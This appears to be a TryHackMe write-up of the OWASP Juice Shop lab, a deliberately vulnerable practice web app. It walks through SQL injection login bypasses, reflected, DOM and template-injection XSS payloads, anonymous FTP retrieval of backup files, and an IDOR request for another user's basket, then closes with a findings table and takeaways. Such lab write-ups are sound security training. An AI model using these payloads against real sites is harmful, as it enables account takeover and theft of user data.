---
title: "OWASP Juice Shop — TryHackMe"
date: 2025-01-08
platform: "TryHackMe"
difficulty: "Easy"
category: "Web"
tags: ["sqli", "xss", "broken-auth", "idor", "owasp"]
published: true
excerpt: "A full walkthrough of OWASP Juice Shop on TryHackMe — demonstrating SQL injection, XSS, broken authentication, and IDOR vulnerabilities in a modern Node.js web application."
---

# OWASP Juice Shop — TryHackMe

**Room:** OWASP Juice Shop
**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** Web Application

OWASP Juice Shop is a deliberately vulnerable web application built with Node.js, Express, and Angular. It's my favourite practice target because it closely mimics real-world e-commerce applications.

---

## Setup

```bash
# Start the machine on TryHackMe, get the IP
export TARGET=10.10.X.X

# Quick initial scan
nmap -sC -sV -p- $TARGET

PORT     STATE SERVICE
3000/tcp open  http    Node.js (Express middleware)
```

Navigate to `http://$TARGET:3000` — the Juice Shop storefront loads.

---

## Task 1: Admin Login via SQL Injection

The login form at `/login` accepts an email and password. Let's test for SQLi:

```
Email: admin@juice-sh.op'--
Password: anything
```

Why this works: the backend query is:
```sql
SELECT * FROM Users WHERE email='admin@juice-sh.op'--' AND password='...'
```

The `'--` closes the string and comments out the password check. We're logged in as admin.

---

## Task 2: DOM XSS

The search functionality at `/#/search?q=` reflects user input without sanitization.

```
http://TARGET:3000/#/search?q=<iframe src="javascript:alert('XSS')">
```

The Angular-based frontend renders the iframe. This is a stored variation:

```html
<script>
// In the feedback form, enter:
<script>alert('XSS')</script>
</script>
```

Better payload for modern apps:

```javascript
{{constructor.constructor('alert(1)')()}}
// Angular template injection
```

---

## Task 3: Sensitive Data Exposure — FTP

Juice Shop has a hidden FTP server exposing backup files.

```bash
ftp $TARGET 21
# Anonymous login works
ls
# acquistions.md  coupons_2013.md.bak  eastere.gg
get acquisitions.md
```

The acquisitions file contains confidential business information — a clear sensitive data exposure finding.

---

## Task 4: IDOR — Access Another User's Basket

After logging in, the basket is at `/api/Baskets/1`. Since I'm user 1, let's check user 2:

```bash
curl -H "Authorization: Bearer $MY_TOKEN" \
  http://$TARGET:3000/api/Baskets/2

# Response: another user's basket contents — IDOR confirmed
```

This would be critical in a real application — reading (and potentially modifying) other users' shopping carts, orders, or personal data.

---

## Task 5: Login as Bender (Weak Password Reset)

Juice Shop's password reset uses security questions. By looking at the user list from the admin panel, I see `bender@juice-sh.op`. The security question is "Company you first worked for as a teenager?"

```
# Quick Google: Bender is a Futurama character
# He "worked" at suicide booth / Planet Express
# Try: "Stop'n'Drop" (Planet Express's planet-wide delivery)
```

Alternatively: SQLi in the reset endpoint:

```
Email: bender@juice-sh.op
Security Answer: ' OR '1'='1
```

---

## Task 6: Reflected XSS on Track Order Page

The track order page (`/track-result`) reflects the order ID in the page:

```
http://TARGET:3000/track-result?id=<script>alert('XSS')</script>
```

No sanitization. Alert fires. Report submitted.

---

## Summary of Findings

| Finding | Severity | Category |
|---------|----------|----------|
| SQL Injection in login | Critical | Injection |
| Admin account takeover | Critical | Broken Auth |
| IDOR on Basket API | High | BAC |
| DOM XSS in search | Medium | XSS |
| Reflected XSS in track order | Medium | XSS |
| FTP anonymous access | Medium | Misconfiguration |
| Sensitive data in FTP | High | Data Exposure |

---

## Key Takeaways

Juice Shop taught me that real applications fail in predictable ways:
1. **Input validation is often absent** in internal/mobile-app-facing APIs
2. **Authorization is checked at the UI layer** but not the API layer — always test the API directly
3. **Reflection without encoding** is surprisingly common in modern SPAs despite frameworks' protections
4. **Anonymous access** to services like FTP often survives because "nobody uses FTP anymore" — until someone does

This room is excellent practice. I recommend completing all 100+ challenges before your first real engagement.
